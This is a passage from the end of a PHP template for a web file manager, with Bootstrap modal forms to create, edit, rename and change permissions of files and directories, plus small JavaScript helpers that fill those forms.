                                <textarea class="form-control resize-none" name="newFileContent" id="newFileContent" rows="10"></textarea>
                            </div>
                            <div class="mb-3 d-flex justify-content-end">
                                <input type="checkbox" class="btn-check" name="newFileForceCreate" id="newFileForceCreate" autocomplete="off">
                                <label class="btn btn-outline-danger" for="newFileForceCreate" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Force the file creation even when the file is already exists.">
                                    <i class="fas fa-circle-check"></i>
                                </label>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn text-black" data-bs-dismiss="modal">Cancel</button>
                            <button class="btn btn-dark" name="createBtn" value="<?= $app->file::TYPE_FILE; ?>">Create</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- createNewDirectoryModal -->
        <div class="modal fade" id="createNewDirectoryModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="createNewDirectoryModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-lg">
                <div class="modal-content">
                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                        <div class="modal-header">
                            <h5 class="modal-title" id="createNewDirectoryModalLabel">Create a new directory</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <div class="mb-3">
                                <label class="form-label" for="newDirectory">Directory Name</label>
                                <input class="form-control <?= $app->session->has($app->session::ERRORS, 'newDirectory') ? 'is-invalid' : '' ?>" type="text" name="newDirectory" id="newDirectory">
                                <?php if ($app->session->has($app->session::ERRORS, 'newDirectory')) : ?>
                                    <small class="text-danger d-inline-block mt-1">
                                        <?= $app->session->getErrors('newDirectory'); ?>
                                    </small>
                                <?php endif; ?>
                            </div>
                            <div class="mb-3 d-flex justify-content-end">
                                <input type="checkbox" class="btn-check" name="newDirectoryForceCreate" id="newDirectoryForceCreate" autocomplete="off">
                                <label class="btn btn-outline-danger" for="newDirectoryForceCreate" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Force the file creation even when the file is already exists.">
                                    <i class="fas fa-circle-check"></i>
                                </label>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn text-black" data-bs-dismiss="modal">Cancel</button>
                            <button class="btn btn-dark" name="createBtn" value="<?= $app->file::TYPE_DIRECTORY; ?>">Create</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- editFileModal -->
        <div class="modal fade" id="editFileModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="editFileModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-lg">
                <div class="modal-content">
                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                        <div class="modal-header">
                            <h5 class="modal-title" id="editFileModalLabel">Edit a file</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <input type="hidden" name="filename" id="filename" value="">
                            <div class="mb-3">
                                <label class="form-label fw-bold" for="fileContent" id="filename-show"></label>
                                <textarea class="form-control resize-none" name="fileContent" id="fileContent" rows="15"></textarea>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn text-black" data-bs-dismiss="modal">Cancel</button>
                            <button class="btn btn-dark" name="updateBtn" value="<?= $app->file::TYPE_DIRECTORY; ?>">Update</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- renameFileModal -->
        <div class="modal fade" id="renameFileModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameFileModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-lg">
                <div class="modal-content">
                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                        <div class="modal-header">
                            <h5 class="modal-title" id="renameFileModalLabel">Rename a file</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <div class="d-flex gap-3">
                                <div class="mb-3 w-100">
                                    <label class="form-label" for="oldFileName">Old File Name</label>
                                    <input class="form-control" type="text" name="oldFileName" id="oldFileName" readonly>
                                </div>
                                <div class="mb-3 w-100">
                                    <label class="form-label" for="newFileName">New File Name</label>
                                    <input class="form-control <?= $app->session->has($app->session::ERRORS, 'newFileName') ? 'is-invalid' : '' ?>" type="text" name="newFileName" id="newFileName">
                                    <?php if ($app->session->has($app->session::ERRORS, 'newFileName')) : ?>
                                        <small class="text-danger d-inline-block mt-1">
                                            <?= $app->session->getErrors('newFileName'); ?>
                                        </small>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn text-black" data-bs-dismiss="modal">Cancel</button>
                            <button class="btn btn-dark" name="renameBtn" value="<?= $app->file::TYPE_FILE; ?>">Rename</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- renameDirectoryModal -->
        <div class="modal fade" id="renameDirectoryModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameDirectoryModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-lg">
                <div class="modal-content">
                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                        <div class="modal-header">
                            <h5 class="modal-title" id="renameDirectoryModalLabel">Rename a directory</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <div class="d-flex gap-3">
                                <div class="mb-3 w-100">
                                    <label class="form-label" for="oldDirectoryName">Old Directory Name</label>
                                    <input class="form-control" type="text" name="oldDirectoryName" id="oldDirectoryName" readonly>
                                </div>
                                <div class="mb-3 w-100">
                                    <label class="form-label" for="newDirectoryName">New Directory Name</label>
                                    <input class="form-control <?= $app->session->has($app->session::ERRORS, 'newDirectoryName') ? 'is-invalid' : '' ?>" type="text" name="newDirectoryName" id="newDirectoryName">
                                    <?php if ($app->session->has($app->session::ERRORS, 'newDirectoryName')) : ?>
                                        <small class="text-danger d-inline-block mt-1">
                                            <?= $app->session->getErrors('newDirectoryName'); ?>
                                        </small>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn text-black" data-bs-dismiss="modal">Cancel</button>
                            <button class="btn btn-dark" name="renameBtn" value="<?= $app->file::TYPE_DIRECTORY; ?>">Rename</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- changePermissionModal -->
        <div class="modal fade" id="changePermissionModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="changePermissionModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-lg">
                <div class="modal-content">
                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                        <div class="modal-header">
                            <h5 class="modal-title" id="changePermissionModalLabel">Change permission</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <input type="hidden" name="filename" id="filename-permission" value="">
                            <div class="mb-3">
                                <label class="form-label fw-bold" for="fileContent" id="filename-show-permission"></label>
                                <input class="form-control" type="number" name="newPermission" id="newPermission">
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn text-black" data-bs-dismiss="modal">Cancel</button>
                            <button class="btn btn-dark" name="changePermissionBtn">Update</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>
        <script>
            // Enable tooltip
            const tooltipTriggerList = document.querySelectorAll('[data-bs-tooltip="tooltip"]')
            const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl))

            // Rename file modal
            const passDataToRenameFileModal = (e) => {
                document.querySelector('#oldFileName').value = e.getAttribute('data-old-file-name')
            }

            // Rename directory modal
            const passDataToRenameDirectoryModal = (e) => {
                document.querySelector('#oldDirectoryName').value = e.getAttribute('data-old-directory-name')
            }

            // Edit file modal
            const passDataToEditFileModal = (e) => {
                dataFileName = e.getAttribute('data-filename')

                document.querySelector('#filename-show').textContent = dataFileName
                document.querySelector('#filename').value = dataFileName
                document.querySelector('#fileContent').value = e.getAttribute('data-file-content')
            }

            // Change permission modal
            const passDataToChangePermissionModal = (e) => {
                dataFileName = e.getAttribute('data-filename')

                document.querySelector('#filename-show-permission').textContent = dataFileName
                document.querySelector('#filename-permission').value = dataFileName
                document.querySelector('#newPermission').value = e.getAttribute('data-permission')
            }
        </script>
    </body>

    </html>

<?php endif;

$app->session->unset($app->session::FLASH);
$app->session->unset($app->session::ERRORS);
